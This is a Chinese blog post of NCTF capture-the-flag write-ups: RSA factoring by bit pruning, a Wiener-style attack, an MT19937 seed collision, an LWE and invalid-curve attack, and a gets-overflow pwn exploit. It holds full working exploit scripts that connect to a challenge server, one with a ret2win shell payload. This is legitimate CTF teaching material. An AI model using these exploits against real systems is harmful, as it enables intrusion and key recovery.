---
title: nctf_wp
date: 2026-04-06 16:06:33
tags:
---
居然还能有我能ak的比赛哈哈
# nctf_wp
## Ez_RSA
### 题目
```py
from Crypto.Util.number import *
from secrets import flag

nbits = 512
p = getPrime(nbits)
q = getPrime(nbits)
n = p * q
e = 65537
m = bytes_to_long(flag)
c = pow(m, e, n)
hint = p ^ int(bin(q)[:1:-1], 2)

print(f"nbits = {nbits}")
print(f"n = {n}")
print(f"e = {e}")
print(f"c = {c}")
print(f"hint = {hint}")

# nbits = 512
# n = 113811568965055236591575124486758679392744553312134148909105203346767338399571149835776281246434662598568061596388663253038256689345299177200416663539845688277447346395189677568405388952270634599590543939397457325519084988358577805564978282375882831765408646889940777372958745826393653515323881370943911243589
# e = 65537
# c = 28637971616659975415203771281328378878549288421921080859079174552593926682380791394169267513651195690175911968893108214839850128311436983081661719981958725955998997347063633351893769712863719014753154993940174947685060864532241899917269380408066913133029163844049218414849768354727966161277243216291473824377
# hint = 157624334507300300837306007943988438905196981213124202656160912356046979618961372023595598201180149465610337965346427263713514476892241848899142885213492
```
### 分析

#### 题目在干什么
一个标准rsa，但给出一个hint
$hint = p \oplus \_q$(_q为q转二进制的逆序)
$e,c,n$
#### 突破口：
肯定从hint入手：
$hint = p \oplus \_q$
再联系另一个pq相关:$n = p*q$
有这两个条件便可以一位位爆破01再按条件剪枝，恢复p，q，
也就是**DFS分支界限法**

#### DFS 剪枝策略
这里剪枝逻辑还是比较复杂的，这里借鉴了一下糖醋小鸡块的exp
- 高位剪枝：当恢复的高位乘积已经大于 n 时，剪枝
- 低位剪枝：当恢复的低位乘积与 n 的低位不匹配时，剪枝
- 中间剪枝：利用异或关系限制 p 和 q 位的可能性
原文：[糖醋小鸡块的exp](https://tangcuxiaojikuai.xyz/post/342113ee.html)

### exp
```py
from Crypto.Util.number import *
import sys
sys.setrecursionlimit(2000)

pxorq_int = 157624334507300300837306007943988438905196981213124202656160912356046979618961372023595598201180149465610337965346427263713514476892241848899142885213492
n = 113811568965055236591575124486758679392744553312134148909105203346767338399571149835776281246434662598568061596388663253038256689345299177200416663539845688277447346395189677568405388952270634599590543939397457325519084988358577805564978282375882831765408646889940777372958745826393653515323881370943911243589
c = 28637971616659975415203771281328378878549288421921080859079174552593926682380791394169267513651195690175911968893108214839850128311436983081661719981958725955998997347063633351893769712863719014753154993940174947685060864532241899917269380408066913133029163844049218414849768354727966161277243216291473824377
e = 65537

pxorq = str(bin(pxorq_int)[2:]).zfill(512)
 
def find(ph, qh, pl, ql):
    l = len(ph)
    
    # 递归终点
    if l == 256:
        pp0 = int(ph + pl, 2)
        if n % pp0 == 0:
            pf = pp0
            qf = n // pp0
            phi = (pf - 1) * (qf - 1)
            d = inverse(e, phi)
            m1 = pow(c, d, n)
            print(long_to_bytes(m1))
            exit()
        return

    tmp0 = ph + (512 - 2 * l) * "0" + pl
    tmp1 = ph + (512 - 2 * l) * "1" + pl
    tmq0 = qh + (512 - 2 * l) * "0" + ql
    tmq1 = qh + (512 - 2 * l) * "1" + ql
    if int(tmp0, 2) * int(tmq0, 2) > n:
        return 
    if int(tmp1, 2) * int(tmq1, 2) < n:
        return

    if (int(pl, 2) * int(ql, 2)) % (2**l) != n % (2**l):
        return

    for p_next in ['0', '1']:
        for q_next in ['0', '1']:
            # 推导 q 的低位
            q_low_next = str(int(p_next) ^ int(pxorq[l]))
            
            # 推导 p 的低位
            p_low_next = str(int(q_next) ^ int(pxorq[511 - l]))
            
            # 递归向内层推进
            find(ph + p_next, qh + q_next, p_low_next + pl, q_low_next + ql)


find("1", "1", "1", "1")
```
## Hard_RSA

### 题目
```py
from Crypto.Util.number import getPrime, bytes_to_long
from secrets import flag

nbits = 512

p = getPrime(nbits)
q = getPrime(nbits)
N = p * q

phi = (p ** 6 - 1) * (q ** 6 - 1)
d = getPrime(int(nbits * 2))
e = pow(d, -1, phi)
m = bytes_to_long(flag)
c = pow(m, e, N)

print(f"{N=}")
print(f"{e=}")
print(f"{c=}")

# N = 74919314162966623026780409394635730851359423962042152804673359696062303592948792225237959325724332015193893411896458285500680923291830113157053732353835717437056282529643649606999636042375356170625223068407005600597432512115745426297620503763041544738664221739366981075762409535100379250338620618401995088237
# e = 115382440363851496163981840486384107492561192043935907058980266086827528886481753709205601977721854806609873255930935032352098823336758578514742052017664624320880734668505025950239731519576865823805968986213809315084654931730883582863309373723686304734918644860412520769285969343584540789781409990492019944165824625815300405767426485317259941101998781323411466463777306753584000597164370440130463322472428512359842079912370327303953535847288486792265729271519703439492772330110292227648936855652822622441290491046329984519666372475460813076592933292830035116887451745183745100906127431677048635228709073140092528296564430074027966676751247853438866388663691773416941464827914578065911403270794793189044046310361812370155771970529353757475322332721624146410615784452731493876192295337760243245754571266092484216808152656042093317366135329225792879900416688516879481855055555090043162672499662746617097324126665279154039087354142631899072583591875973448566342261418757933958097491430624847778317939143939884707606327061346526895306935081814341167557148974540052519764420837504151687245003054945691565644413351468736320044794906326974209391387438080503466412668871800294636642414652459851564340761041186735760949703483158497968185223108721790483665796212381899768853381692611758739543856321631250649771030357257110672427660801480674245151183281118006855095936338551269908982677103650278164957043853181158383261830382128373562401278765223263898827117486913915002789859131458355569155109058470780395630260922250802643984468511286231457608106175597829905176417125226959444682393922189933288709798973807586352487516329712976257944503755516552005154708122299515447476835290766731627959030431596313710392337334874777621376729257439721939577794752381362801045781355354034613981044768946879601448500750228731652608416508751483139575431367276816127751324213761
# c = 46597101834449995414927716136287390792937263485498695607622613274985303919148099277379370499625616739447192289360957892792459785981292432370520768029645163669042553465834050214430965629198749117682681268121937191602353019996971164117733452207322953311422907574742284390173017434719506924876701654539254320355

```
### 分析
在本题中：
$$\phi = (p^6 - 1)(q^6 - 1)$$
$$e \cdot d \equiv 1 \pmod{\phi} \implies e \cdot d - k \cdot \phi = 1$$
接下来分析一下各个变量的数据：
- $p, q$ 分别是 512 bits，$N = p \times q$ 是 1024 bits。
- $d$ 的大小为 $2 \times 512 = 1024$ bits。
- $\phi = (p^6 - 1)(q^6 - 1) \approx p^6 q^6 = N^6$，因此 $\phi$ 是一个非常庞大的数字(6144 bits)
- $\phi 非常大，同时也就决定的e也会非常大$

可以从大小看出来此题可能要用winner攻击

将上面的等式除以 $d \cdot \phi$，可以进行变形：$$\frac{e}{\phi} - \frac{k}{d} = \frac{1}{d \cdot \phi}$$

用 $N^6$ 来近似替代 $\phi$
使用连分数展开$e/N^6$，其中某个收敛分数可能就是$k/d$
### exp
```py
from Crypto.Util.number import long_to_bytes

N = 74919314162966623026780409394635730851359423962042152804673359696062303592948792225237959325724332015193893411896458285500680923291830113157053732353835717437056282529643649606999636042375356170625223068407005600597432512115745426297620503763041544738664221739366981075762409535100379250338620618401995088237
e = 115382440363851496163981840486384107492561192043935907058980266086827528886481753709205601977721854806609873255930935032352098823336758578514742052017664624320880734668505025950239731519576865823805968986213809315084654931730883582863309373723686304734918644860412520769285969343584540789781409990492019944165824625815300405767426485317259941101998781323411466463777306753584000597164370440130463322472428512359842079912370327303953535847288486792265729271519703439492772330110292227648936855652822622441290491046329984519666372475460813076592933292830035116887451745183745100906127431677048635228709073140092528296564430074027966676751247853438866388663691773416941464827914578065911403270794793189044046310361812370155771970529353757475322332721624146410615784452731493876192295337760243245754571266092484216808152656042093317366135329225792879900416688516879481855055555090043162672499662746617097324126665279154039087354142631899072583591875973448566342261418757933958097491430624847778317939143939884707606327061346526895306935081814341167557148974540052519764420837504151687245003054945691565644413351468736320044794906326974209391387438080503466412668871800294636642414652459851564340761041186735760949703483158497968185223108721790483665796212381899768853381692611758739543856321631250649771030357257110672427660801480674245151183281118006855095936338551269908982677103650278164957043853181158383261830382128373562401278765223263898827117486913915002789859131458355569155109058470780395630260922250802643984468511286231457608106175597829905176417125226959444682393922189933288709798973807586352487516329712976257944503755516552005154708122299515447476835290766731627959030431596313710392337334874777621376729257439721939577794752381362801045781355354034613981044768946879601448500750228731652608416508751483139575431367276816127751324213761
c = 46597101834449995414927716136287390792937263485498695607622613274985303919148099277379370499625616739447192289360957892792459785981292432370520768029645163669042553465834050214430965629198749117682681268121937191602353019996971164117733452207322953311422907574742284390173017434719506924876701654539254320355

def convergents(num, den):
    #连分数
    p0, p1 = 0, 1
    q0, q1 = 1, 0
    while den != 0:
        a = num // den
        num, den = den, num % den
        p0, p1 = p1, a * p1 + p0
        q0, q1 = q1, a * q1 + q0
        yield p1, q1


N6 = N ** 6
for k, d in convergents(e, N6):
    if k <= 1 or d <= 1:
         continue
        
    if d.bit_length() < 1000:
            continue
            
    if (e * d - 1) % k != 0:
            continue        
    m = pow(c, d, N)
    msg = long_to_bytes(m)
    if b'flag{' in msg or b'ctf{' in msg or b'}' in msg:
        print(f"{msg.decode('utf-8', errors='ignore')}")
        break
```
## RNG GAME
### 题目
```txt
[x] Opening connection to 114.66.24.221 on port 35896
[x] Opening connection to 114.66.24.221 on port 35896: Trying 114.66.24.221
[+] Opening connection to 114.66.24.221 on port 35896: Done
[*] Switching to interactive mode
Welcome RNG GAME!!

In this game, I'll give you a seed that I used to generate a random number, and you need to give me a different seed that can generate the same random number. If you can do it, you will get the flag!!

Here is my seed: 292188839097896339823144826199846165803
```

### 分析
容器用的是 Python 的 random.seed(int)，CPython 底层会先把整数种子取绝对值，再初始化 RNG，所以 S 和 -S 会得到完全相同的随机状。
所以实际做法很简单：
连上给seed加一个负号发回去就行了
### exp
无
![alt text](1.png)

## RNG GAME revenge
### 题目
```txt
[x] Opening connection to 114.66.24.221 on port 42133
[x] Opening connection to 114.66.24.221 on port 42133: Trying 114.66.24.221
[+] Opening connection to 114.66.24.221 on port 42133: Done
[*] Switching to interactive mode
Welcome RNG GAME!!

In this game, I'll give you a seed that I used to generate a random number, and you need to give me a different seed that can generate the same random number. If you can do it, you will get the flag!!

Here is my seed: 181930321019515717634582396341010528431
```
### 分析
发负号不给过，大概率要老老实实找seed了~
##### mt安全性分析
1. 当我们调用 random.seed(x) 并且 x 是一个超大整数时，Python 底层会先把它切片。Python 会把它按 32 位为一块，切成一个 C 数组。原 Seed(128位)切分后，就变成了一个长度 $L = 4$ 的数组$K$。$K = [k_0, k_1, k_2, k_3]$

2. 接下来，Python 会把这个数组 $K$ 混淆进 MT19937 的状态矩阵（长度为 624 的数组）里。在 CPython 的 _randommodule.c 的 init_by_array 函数中，有这么一个关键的循环：
```c++
// i 是状态矩阵的索引，j 是种子数组的索引
// key_length 就是我们刚才的 L (等于 4)
for (; k; k--) {
    mt[i] = (mt[i] ^ ((mt[i-1] ^ (mt[i-1] >> 30)) * 1664525UL))
          + init_key[j] + j;  // <--- 漏洞就在这！
    
    i++; j++;
    if (i >= 624) { mt[0] = mt[623]; i = 1; }
    if (j >= key_length) j = 0; // <--- j 越界后会归零
}
```
#### 核心构造
$j$由0到3就会清零，长度为4，所以我们可构造$K'$ ，长度$L'$为8(这里12，16都可以，与8同理)。
前4个元素：$K'[0 \dots 3] = K[0 \dots 3]$
与原k相同
后四个元素：
$$K'[4] + 4 \equiv K[0] + 0 \pmod{2^{32}}$$
$$K'[5] + 5 \equiv K[1] + 1 \pmod{2^{32}}$$
$$......$$
由此得到$K'[4],K'[5],K'[6],K'[7]$
再把这个长度为 8 的新数组重组为新 Seed，把这个数组重新拼装成一个超大正整数即为所求。
### exp
```py
words = []
seed = 181930321019515717634582396341010528431
while seed > 0:
    words.append(seed & 0xffffffff)
    seed>>= 32
        
L = len(words)
    
# 拼接第二段,抵消掉索引 j 带来的影响
new_words = words.copy()
for w in words:
    new_words.append((w - L) & 0xffffffff)
        
    # 重新组装成一个新的超大整数
new_seed = 0
for i, w in enumerate(new_words):
    new_seed += w << (32 * i)
        

print(f"{new_seed}")
```
把结果发回去就能出flag
![alt text](2.png)
## yqs
既然叫让ai打那就让ai打吧哈哈
### 题目
```py
from util import *
import os
from hashlib import sha256, sha512
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def pack_point(P):
    x, y = P
    return (int(x) << 256) | int(y)


def unpack_point(n):
    x = n >> 256
    y = n & ((1 << 256) - 1)
    return (x, y)


def get_curve25519_base():
    p = 2**255 - 19
    x = 9
    y2 = (x**3 + 486662*x**2 + x) % p
    y = pow(y2, (p + 3) // 8, p)
    if (y * y) % p != y2:
        y = (y * pow(2, (p - 1) // 4, p)) % p
    return (x, y)


def vec2key(v, q, N):
    x = 0
    for i in range(N):
        x += int(v[i]) * (q ** i)
    return int.from_bytes(sha256(str(x).encode()).digest(), 'little')


MAX_MSG = 100


if __name__ == '__main__':
    ecc = ECC(486662, 1, 2**255 - 19)
    G = (9, 14781619447589544791020593568409986887264606134616475288964881837755586237401)
    
    master_sec = int.from_bytes(os.urandom(30))
    master_pub = ecc.mul(G, master_sec)
    
    print(f"[+] The Celestial Master's Seal: {pack_point(master_pub)}")
    
    flag = os.environ.get("FLAG",'')
    aes_key = sha256(str(master_sec).encode()).digest()
    enc_flag = AES.new(aes_key, AES.MODE_ECB).encrypt(pad(flag.encode(), 32))
    print(f"[+] Heavenly Cipher: {enc_flag.hex()}")
    
    round_num = 0
    
    while True:
        round_num += 1
        lwe = LWE()
        msg_count = 0
        
        print(f"[+] Crystal domain's modulus for today: {lwe.q}")

        while True:
            print(f"\n[+] Round {round_num} | Spiritual trials: {msg_count}/{MAX_MSG}")

            choice = input("[-] Channel your intent (m=message, e=exchange):").strip()
            
            if choice == 'm':
                if msg_count >= MAX_MSG:
                    print("[!] Your spiritual energy is depleted this round.")
                    continue
                
                try:
                    msg = int(input("[-] Offer your spiritual essence (int):").strip())
                except ValueError:
                    print("[!] Invalid essence format")
                    continue
                
                msg_bytes = str(msg).encode()
                m_hash = int(sha512(msg_bytes).hexdigest(), 16)
                m_trunc = m_hash & ((1 << 128) - 1)
                
                ct = lwe.encrypt(m_trunc)
                print(f"[+] Resonance echoes: {ct}")
                msg_count += 1
            
            elif choice == 'e':
                try:
                    point_int = int(input("[-] Forge your spirit formation (int):").strip())
                except ValueError:
                    print("[!] Invalid formation")
                    continue
                
                point_int &= (1 << 512) - 1
                x, y = unpack_point(point_int)
                
                priv = lwe.export_priv_key()
                x ^= priv
                y ^= priv
                
                result = ecc.mul((x, y), master_sec)
                if result is None:
                    print("[+] Domain resonance: 0")
                else:
                    print(f"[+] Domain resonance: {pack_point(result)}")
                break
            
            else:
                print("[!] Invalid input")
```
### 分析
先看 `m` 分支。虽然代码里取了 `sha512(msg)` 的低 128 bit，但 util.py 里的 `encrypt()` 又把消息截成了低 8 bit：

```py
def encrypt(self, m):
    m = m & ((1 << 8) - 1)
```

所以我们只需要找一个整数 `msg` 满足：

```text
sha512(str(msg)) & 0xff == 0
```

就能让一整轮 100 次 `m` 查询都变成

```text
b = <a, s> + e mod q,  e in {0,1,2,3}
```

也就是低噪声 LWE 样本。实际可用的一个值是 `155`。  
每轮拿到 100 组样本后，把 `a_int` 按 `q` 进制拆成 77 维向量，记成：

```text
b = A s + e mod q
```

其中 `A` 是 `100 x 77` 矩阵。取一个可逆的 `77 x 77` 子矩阵 `A1`，剩余部分记为 `A2`，构造

```text
A' = A2 * A1^-1 mod q
```

再构造 q-ary lattice：

```text
B = [ I   0 ]
    [ A' qI ]
```

对目标向量 `(b1, b2)` 做 Babai 最近平面，就能恢复 `A1 * s`，进而得到整轮的 `s`，最后按题目自己的编码方式导出：

```text
priv = sum(s_i * q^i)
```

然后看 `e` 分支。这里的椭圆曲线实现有两个关键问题：

1. `ECC.add()` 根本不检查输入点是否在曲线上。
2. 加法公式只用到了 `a=486662` 和 `p`，完全没有用到 `b`。

这意味着它实际上接受任意满足

```text
y^2 = x^3 + 486662x + c
```

的点参与运算。甚至题目给的基点 `G` 本身都不在 `b=1` 这条曲线上，而是在

```text
y^2 = x^3 + 486662x + 35039673
```

上。

`e` 分支会先把输入坐标和本轮 `priv` 异或，再做标量乘：

```py
priv = lwe.export_priv_key()
x ^= priv
y ^= priv
result = ecc.mul((x, y), master_sec)
```

由于我们已经通过 `m` 分支恢复了本轮 `priv`，所以可以反向构造输入，让异或后的点在模 `p` 意义下等于我们指定的目标点 `T=(X,Y)`。做法是把 `priv` 拆成：

```text
low  = priv mod 2^256
high = priv - low
```

由于 `high` 的低 256 位全为 0，只要令

```text
X' = (X - high) mod p
Y' = (Y - high) mod p
send_x = low xor X'
send_y = low xor Y'
```

那么服务端异或后得到的坐标就与 `(X,Y)` 模 `p` 同余，最终群运算效果等价于把目标点 `T` 送进 `ecc.mul()`。

接下来离线在若干条

```text
y^2 = x^3 + 486662x + c
```

上找平滑小阶点。每轮送一个小阶点进去，得到：

```text
R = [master_sec]T
```

再在对应小阶子群里做离散对数，拿到 `master_sec mod r`。多轮结果用 CRT 合并，只要模数总位数超过 `master_sec` 的 240 bit，就能唯一恢复 `master_sec`。

最后按题目给的方式：

```py
aes_key = sha256(str(master_sec).encode()).digest()
```

直接解 AES-ECB 即可拿到 flag。

样例实例最终恢复出的 flag 为：

```text
flag{2fda0938-0e4e-47fe-a93c-e3acdd7f3991}
```

### exp
```py
import ast
import math
import re
import socket
import sys
from hashlib import sha256, sha512

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from sage.all import GF, ZZ, EllipticCurve, Matrix, Zmod, block_matrix, identity_matrix, vector, zero_matrix
from sage.groups.generic import discrete_log
from sage.modules.free_module_integer import IntegerLattice

P = 2**255 - 19
A = 486662
N = 77
SECRET_BITS = 30 * 8
CHOICE_PROMPT = b"Channel your intent (m=message, e=exchange):"
MSG_PROMPT = b"Offer your spiritual essence (int):"
EXCH_PROMPT = b"Forge your spirit formation (int):"

CANDIDATES = [
    {
        "order": 729380,
        "x": 54007250996756016609984692531703789983497466652543853648505076115209714422153,
        "y": 11420948079344624061811117947033700600731869911104045029545364046925771560076,
    },
    {
        "order": 3017190559154,
        "x": 39782261549721368487544338429217710875590504917981451751598775240647005804997,
        "y": 27058902655726988991642482147940031647344453312080849459903019379414322243475,
    },
    {
        "order": 809863230466,
        "x": 21339865532795799406936306284210884594099822460002277878372278469343891360746,
        "y": 32182642312486764320242949115055469439114620593482803708238522045960937213144,
    },
    {
        "order": 860319,
        "x": 13550293931699101904714641619878495026615649507264721134559143223932928862386,
        "y": 11612790386843864019292277240308042421041359280444393244236636574190211403688,
    },
    {
        "order": 2337977514391113965,
        "x": 21133093359692079394854028785492482788766880358441260098104401216605063074380,
        "y": 53530943094771985304629905502141040624590200283766154915618701800559943124530,
    },
    {
        "order": 888210,
        "x": 40506358286513472400985913263522669061494354309206609486915726034358945994147,
        "y": 36220157836862305911637606530382611288202887461403242698515771373540756378673,
    },
    {
        "order": 1023697,
        "x": 19484570579711046539651373485362066824795512357288131780385143876336351578393,
        "y": 52656309065833811451596525672860538290986318899927877747856848400355980031706,
    },
    {
        "order": 165704196346,
        "x": 13929110909751300203916093363322431336425294736761806612242601099507985842813,
        "y": 23276731423880951278521450484902716348381544670150601982335984310115542744750,
    },
]


def pack_point(x, y):
    return (int(x) << 256) | int(y)


def unpack_point(n):
    return n >> 256, n & ((1 << 256) - 1)


def int_to_vec(value, q):
    coeffs = []
    for _ in range(N):
        coeffs.append(value % q)
        value //= q
    return coeffs


def find_zero_hash_msg():
    x = 0
    while True:
        if int(sha512(str(x).encode()).hexdigest(), 16) & 0xFF == 0:
            return x
        x += 1


ZERO_HASH_MSG = find_zero_hash_msg()


class Tube:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port))
        self.sock.settimeout(30)
        self.buf = b""

    def recvuntil(self, marker):
        while marker not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("connection closed")
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out

    def recvline(self):
        return self.recvuntil(b"\n")

    def sendline(self, data):
        self.sock.sendall(data + b"\n")


def parse_round_header(data):
    text = data.decode(errors="ignore")
    master_pub = int(re.search(r"Celestial Master's Seal:\s*(\d+)", text).group(1))
    enc_flag = bytes.fromhex(re.search(r"Heavenly Cipher:\s*([0-9a-fA-F]+)", text).group(1))
    q = int(re.search(r"Crystal domain's modulus for today:\s*(\d+)", text).group(1))
    return master_pub, enc_flag, q


def validate_secret(q, rows, samples, secret):
    for row, (_, b) in zip(rows, samples):
        lhs = sum((ai * si) % q for ai, si in zip(row, secret)) % q
        err = (b - lhs) % q
        if err > 3 and q - err > 3:
            return False
    return True


def recover_secret_vector(q, samples):
    rows = [int_to_vec(a_int, q) for a_int, _ in samples]
    A_full = Matrix(Zmod(q), rows)
    pivot_rows = list(A_full.pivot_rows())
    order = pivot_rows + [i for i in range(len(samples)) if i not in pivot_rows]

    A = Matrix(Zmod(q), [rows[i] for i in order])
    b = vector(ZZ, [samples[i][1] for i in order])

    A1 = A[:N]
    A2 = A[N:]
    A1_inv = A1.inverse()
    Aprime = (A2 * A1_inv).change_ring(ZZ)

    extra = len(samples) - N
    basis = block_matrix(
        ZZ,
        [
            [identity_matrix(ZZ, N), zero_matrix(ZZ, N, extra)],
            [Aprime, q * identity_matrix(ZZ, extra)],
        ],
    )

    lattice = IntegerLattice(basis.transpose(), lll_reduce=True)
    closest = vector(ZZ, lattice.babai(b))
    y1 = vector(Zmod(q), list(closest[:N]))
    secret = [int(x) for x in (A1_inv * y1)]

    if not validate_secret(q, rows, samples, secret):
        closest = vector(ZZ, lattice.closest_vector(b))
        y1 = vector(Zmod(q), list(closest[:N]))
        secret = [int(x) for x in (A1_inv * y1)]
    return secret


def export_priv(q, secret):
    acc = 0
    mul = 1
    for coeff in secret:
        acc += coeff * mul
        mul *= q
    return acc


def craft_exchange_input(priv, target_x, target_y):
    low = priv & ((1 << 256) - 1)
    high = priv & ~((1 << 256) - 1)
    high_mod = high % P
    tx = (target_x - high_mod) % P
    ty = (target_y - high_mod) % P
    return pack_point(low ^ tx, low ^ ty)


def dlog_on_candidate(candidate, response_int):
    curve_c = (candidate["y"] * candidate["y"] - candidate["x"] ** 3 - A * candidate["x"]) % P
    curve = EllipticCurve(GF(P), [A, curve_c])
    base = curve(candidate["x"], candidate["y"])
    if response_int == 0:
        return 0
    rx, ry = unpack_point(response_int)
    point = curve(rx, ry)
    return int(discrete_log(point, base, ord=candidate["order"], operation="+"))


def crt_pair(a1, m1, a2, m2):
    g = math.gcd(m1, m2)
    lcm = m1 // g * m2
    k = ((a2 - a1) // g) * pow(m1 // g, -1, m2 // g) % (m2 // g)
    return (a1 + m1 * k) % lcm, lcm


def decrypt_flag(ciphertext, master_sec):
    key = sha256(str(master_sec).encode()).digest()
    plain = AES.new(key, AES.MODE_ECB).decrypt(ciphertext)
    return unpad(plain, 32)


def solve(host, port):
    io = Tube(host, port)
    residue, modulus = 0, 1

    banner = io.recvuntil(CHOICE_PROMPT)
    _, enc_flag, q = parse_round_header(banner)

    for candidate in CANDIDATES:
        samples = []
        for _ in range(100):
            io.sendline(b"m")
            io.recvuntil(MSG_PROMPT)
            io.sendline(str(ZERO_HASH_MSG).encode())
            io.recvuntil(b"Resonance echoes: ")
            samples.append(ast.literal_eval(io.recvline().decode().strip()))

        secret = recover_secret_vector(q, samples)
        priv = export_priv(q, secret)

        io.sendline(b"e")
        io.recvuntil(EXCH_PROMPT)
        payload = craft_exchange_input(priv, candidate["x"], candidate["y"])
        io.sendline(str(payload).encode())
        io.recvuntil(b"Domain resonance: ")
        response_int = int(io.recvline().decode().strip())

        residue_i = dlog_on_candidate(candidate, response_int)
        residue, modulus = crt_pair(residue, modulus, residue_i, candidate["order"])

        if modulus.bit_length() > SECRET_BITS:
            break

        banner = io.recvuntil(CHOICE_PROMPT)
        _, _, q = parse_round_header(banner)

    flag = decrypt_flag(enc_flag, residue)
    print(flag.decode())


if __name__ == "__main__":
    solve(sys.argv[1], int(sys.argv[2]))
```
## Encryption
笔者不会打pwn题，照着ai的思路写一写吧
### 题目
```py
附件：
- main
- exploit.py

原始 exploit.py 可以通过 ret2win 打到低权限 shell，但拿不到 flag。
真正目标是利用 gets 溢出覆盖加密上下文，直接让程序输出一个可逆的 flag 密文。
```
### 分析
程序流程很直接：

1. 初始化 `libcipher.so` 的加密上下文 `ctx`
2. `gets` 读取用户输入到栈上缓冲区
3. `strlen` 检查输入长度是否超过 64
4. 加密用户输入并输出
5. 读取 `/flag`，加密后输出 `Flag Ciphertext`

原来的 `ret2win` 链会跳到 `0x401436`，执行：

```c
system("su ctf -s /bin/sh");
```

这只能拿到 `ctf` 用户 shell，而远端 `/flag` 是 `600 root:root`，所以这条链不是正解。

真正的点在于：

- `gets` 没有限制长度
- 长度检查在 `gets` 之后
- 用户输入缓冲区后面紧跟着就是加密上下文 `ctx`

也就是说，输入不仅能覆盖返回地址，也能先覆盖 `ctx`。

关键栈布局：

- 输入缓冲区：`rbp-0x3e0`
- `ctx`：`rbp-0x3a0`
- RIP 偏移：`0x3e8`

由于 `gets` 支持写入 `\x00`，我们可以：

- 前 64 字节放正常可见字符
- 后面继续跟大量 `\x00`

这样 `strlen(buf)` 只会看到前面的可见内容，长度检查通过，但后面的 `ctx` 已经被改坏了。

逆完 `libcipher.so` 后可以发现：

- `ctx[0x000:0x150]` 是轮密钥区
- `ctx[0x150:0x250]` 是替换表
- `ctx[0x250:0x350]` 是逆替换表
- `ctx[0x350] = 0x14`，即 20 轮

最关键的是，这题的替换表其实是恒等映射，不是真正的 AES S-box：

```c
for (i = 0; i <= 0xff; i++) {
    sbox[i] = i;
    invsbox[i] = i;
}
```

所以只要把前 `0x150` 字节轮密钥区清零，加密就退化成一个固定的线性变换。

最终利用方式：

- 发送 64 字节已知明文
- 再发送 `0x150` 个 `\x00` 清空轮密钥
- 程序会输出：
  - 我们已知明文的密文
  - flag 的密文

因为这时加密器已经没有未知密钥，本地把这个线性变换逆掉即可恢复 flag。

我这里选的已知明文是：

```py
b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
```

脚本会先用这段已知明文做自校验，确认逆过程正确，再去解 `Flag Ciphertext`。

最终拿到的 flag 为：

```text
flag{327d6902-abe7-4c55-ae45-5c382d128ae9}
```

### exp
```py
from pwn import *
import sys

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

HOST = sys.argv[1] if len(sys.argv) > 1 else "114.66.24.221"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 35588
MODE = sys.argv[3] if len(sys.argv) > 3 else "solve"

RET = 0x401384
WIN = 0x401436
EXIT_PLT = 0x401320
OFFSET = 0x3E8
ROUNDKEY_AREA = 0x150
KNOWN_PLAIN = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"


def build_shell_payload():
    return flat(
        b"A" * 64,
        b"\x00",
        b"B" * (OFFSET - 65),
        RET,
        WIN,
        EXIT_PLT,
        b"\n",
    )


def build_solve_payload():
    return KNOWN_PLAIN + (b"\x00" * ROUNDKEY_AREA) + b"\n"


def gmul(a, b):
    out = 0
    for _ in range(8):
        if b & 1:
            out ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1B
        b >>= 1
    return out


def inv_column_rotate(block):
    out = bytearray(16)
    for row in range(4):
        for col in range(4):
            src_row = (row - col) % 4
            out[row * 4 + col] = block[src_row * 4 + col]
    return bytes(out)


def inv_mix_rows(block):
    out = bytearray(16)
    for row in range(4):
        base = row * 4
        a0, a1, a2, a3 = block[base : base + 4]
        out[base + 0] = gmul(a0, 14) ^ gmul(a1, 11) ^ gmul(a2, 13) ^ gmul(a3, 9)
        out[base + 1] = gmul(a0, 9) ^ gmul(a1, 14) ^ gmul(a2, 11) ^ gmul(a3, 13)
        out[base + 2] = gmul(a0, 13) ^ gmul(a1, 9) ^ gmul(a2, 14) ^ gmul(a3, 11)
        out[base + 3] = gmul(a0, 11) ^ gmul(a1, 13) ^ gmul(a2, 9) ^ gmul(a3, 14)
    return bytes(out)


def decrypt_block(block):
    state = bytes(block)
    for _ in range(19):
        state = inv_column_rotate(state)
        state = inv_mix_rows(state)
    state = inv_column_rotate(state)
    return state


def unpad(data):
    if not data:
        return data
    pad = data[-1]
    if not 1 <= pad <= 16:
        return data
    if data.endswith(bytes([pad]) * pad):
        return data[:-pad]
    return data


def decrypt_bytes(cipher):
    plain = b"".join(decrypt_block(cipher[i : i + 16]) for i in range(0, len(cipher), 16))
    return unpad(plain)


def main():
    io = remote(HOST, PORT)

    if MODE == "shell":
        io.recvrepeat(0.2)
        io.send(build_shell_payload())
        io.interactive()
        return

    io.recvuntil(b"Enter plaintext in chars (max 64 chars):\n")
    io.send(build_solve_payload())

    io.recvuntil(b"Ciphertext (hex): ")
    plain_ct = bytes.fromhex(io.recvline().strip().decode())
    io.recvuntil(b"Flag Ciphertext (hex): ")
    flag_ct = bytes.fromhex(io.recvline().strip().decode())

    if decrypt_bytes(plain_ct) != KNOWN_PLAIN:
        log.failure("self-check failed")
        sys.exit(1)

    flag = decrypt_bytes(flag_ct)
    log.success(f"flag = {flag.decode(errors='replace')}")
    io.close()


if __name__ == "__main__":
    main()
```